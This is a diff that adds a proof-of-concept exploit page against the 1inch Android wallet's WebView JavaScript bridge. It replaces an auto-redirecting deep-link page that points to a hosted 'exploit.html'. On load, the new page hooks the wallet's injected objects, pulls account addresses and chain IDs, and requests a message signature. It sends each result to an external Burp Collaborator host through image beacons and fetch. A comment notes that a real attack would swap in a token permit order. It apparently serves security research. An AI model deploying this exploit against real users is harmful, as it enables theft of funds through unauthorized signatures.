@@ -1,25 +1,158 @@
-<!doctype html>                                                                                                                                                                                                  
-  <html lang="en">
-  <head>                                                                                                                                                                                                           
-  <meta charset="utf-8">                                                                                                                                                                                           
-  <meta name="viewport" content="width=device-width,initial-scale=1">                                                                                                                                              
-  <title>OSL — promo</title>                  
-  <style>                                 
-    body{font-family:-apple-system,system-ui,Segoe UI,Roboto,sans-serif;background:#0b1220;color:#e6e9ef;text-align:center;padding:32px 20px}
-    h1{font-weight:600;margin-bottom:8px}                                                                                                                                                                          
-    p{opacity:.8}                             
-    a.btn{display:inline-block;margin-top:24px;padding:16px 28px;background:#1f8efa;color:#fff;text-decoration:none;border-radius:10px;font-size:17px;font-weight:600}                                             
-  </style>                                                                                                                                                                                                         
-  </head>                                                                                                                                                                                                          
-  <body>                                                                                                                                                                                                           
-  <h1>Opening OSL…</h1>                                                                                                                                                                                            
-  <p>If the OSL app does not open automatically, tap the button.</p>
-  <a class="btn" id="go" href="osl://app/web?url=https%3A%2F%2Fxaleraf4ra.github.io%2Ftest-poc.github.io%2Fexploit.html">Open in OSL</a>                                                                           
-  <script>                                    
-    // Auto-fire (some Android browsers honour this without a user gesture)
-    setTimeout(function(){                                                                                                                                                                                         
-      window.location.href = document.getElementById('go').href;                                                                                                                                                   
-    }, 300);                                                                                                                                                                                                       
-  </script>                                                                                                                                                                                                        
-  </body>         
-  </html>
+<!doctype html>
+<html>
+<head><meta charset="utf-8"><title>1inch WebView Bridge PoC</title></head>
+<body style="font-family:-apple-system,sans-serif;padding:16px">
+<h3>1inch Android — action_deeplink → w3browser PoC</h3>
+<pre id="log">waiting for bridge...</pre>
+<button id="signBtn" disabled>personal_sign (permit-style)</button>
+
+<script>
+// ====== CONFIG ======
+// Замени на свой Burp Collaborator хост
+var COLLAB = "https://bo3ocvi12picqdadm4fxriio7fd61xpm.oastify.com";
+// ====================
+
+var logEl = document.getElementById('log');
+function log(){
+  var s = Array.prototype.slice.call(arguments).map(function(x){
+    try { return typeof x==='string'? x : JSON.stringify(x); } catch(e){ return String(x); }
+  }).join(' ');
+  logEl.textContent += "\n" + s;
+  console.log(s);
+}
+
+function exfil(tag, data){
+  try {
+    var payload = {
+      tag: tag,
+      ua: navigator.userAgent,
+      href: location.href,
+      data: data,
+      t: Date.now()
+    };
+    // 1) image beacon — работает даже если fetch заблокирован CSP
+    var img = new Image();
+    img.src = COLLAB + "/" + encodeURIComponent(tag) +
+              "?d=" + encodeURIComponent(JSON.stringify(payload));
+    // 2) fetch — на случай если есть
+    if (window.fetch) {
+      fetch(COLLAB + "/f/" + tag, {
+        method: "POST",
+        mode: "no-cors",
+        body: JSON.stringify(payload)
+      }).catch(function(){});
+    }
+  } catch(e) { log("exfil err", e.message); }
+}
+
+// Прилетевший адрес от нативного кода:
+//   window.OneInchIOSWallet.accountChanged('0x...')
+//   window.OneInchSolanaWallet.accountChanged('...')
+function hookWalletObject(name){
+  var tries = 0;
+  var iv = setInterval(function(){
+    tries++;
+    var w = window[name];
+    if (w && typeof w.accountChanged === 'function' && !w.__hooked){
+      var orig = w.accountChanged.bind(w);
+      w.accountChanged = function(addr){
+        log(name + ".accountChanged:", addr);
+        exfil(name + "_account", { address: addr });
+        try { return orig(addr); } catch(e){}
+      };
+      w.__hooked = true;
+      log("hooked " + name);
+    }
+    if (tries > 200) clearInterval(iv);
+  }, 50);
+}
+hookWalletObject('OneInchIOSWallet');
+hookWalletObject('OneInchSolanaWallet');
+
+// Прямой вызов request() — возвращает accounts
+function probeEvm(){
+  var W = window.OneInchIOSWallet;
+  if (!W || typeof W.request !== 'function') {
+    log("OneInchIOSWallet.request not available yet");
+    return;
+  }
+  try {
+    var p = W.request({ method: "eth_accounts", params: [] });
+    if (p && p.then) {
+      p.then(function(r){
+        log("eth_accounts:", r);
+        exfil("eth_accounts", r);
+      }).catch(function(e){ log("eth_accounts err", e && e.message); });
+    } else {
+      log("eth_accounts sync:", p);
+      exfil("eth_accounts_sync", p);
+    }
+  } catch(e) { log("probeEvm err", e.message); }
+
+  try {
+    var p2 = W.request({ method: "eth_chainId", params: [] });
+    if (p2 && p2.then) p2.then(function(r){
+      log("chainId:", r); exfil("chainId", r);
+    });
+  } catch(e){}
+}
+
+function probeSol(){
+  var S = window.OneInchSolanaWallet;
+  if (!S || typeof S.request !== 'function') return;
+  try {
+    var p = S.request({ method: "connect", params: [] });
+    if (p && p.then) p.then(function(r){
+      log("sol connect:", r); exfil("sol_connect", r);
+    });
+  } catch(e){ log("probeSol err", e.message); }
+}
+
+// Прямое сырое сообщение в мост — подстраховка на случай,
+// если обёртка OneInchIOSWallet инициализируется поздно.
+function rawBridge(){
+  try {
+    if (window.jsBridge && typeof jsBridge.postEvmMessage === 'function') {
+      var id = Math.floor(Math.random()*1e9);
+      jsBridge.postEvmMessage(JSON.stringify({
+        id: id, jsonrpc: "2.0",
+        method: "eth_accounts", params: []
+      }));
+      log("raw postEvmMessage sent id=" + id);
+    } else {
+      log("jsBridge not exposed on window");
+    }
+  } catch(e){ log("rawBridge err", e.message); }
+}
+
+// Демонстрация impact: personal_sign — в реальной атаке сюда ставится
+// EIP-2612 permit / Permit2 / Seaport-order. Для PoC — безобидная строка.
+document.getElementById('signBtn').onclick = function(){
+  var W = window.OneInchIOSWallet;
+  if (!W) return log("no wallet");
+  W.request({ method: "eth_accounts", params: [] }).then(function(accs){
+    var addr = (accs && accs[0]) || "0x0";
+    var msg = "0x" + Array.from("PoC: proving signature capture — "+Date.now())
+                .map(function(c){return c.charCodeAt(0).toString(16).padStart(2,'0');}).join('');
+    return W.request({ method: "personal_sign", params: [msg, addr] });
+  }).then(function(sig){
+    log("signature:", sig);
+    exfil("personal_sign", { signature: sig });
+  }).catch(function(e){ log("sign err", e && e.message); });
+};
+
+// Автостарт
+setTimeout(function(){
+  exfil("loaded", { bridges: {
+    evm: !!window.OneInchIOSWallet,
+    sol: !!window.OneInchSolanaWallet,
+    raw: !!(window.jsBridge && window.jsBridge.postEvmMessage)
+  }});
+  probeEvm();
+  probeSol();
+  rawBridge();
+  document.getElementById('signBtn').disabled = false;
+}, 500);
+</script>
+</body>
+</html>
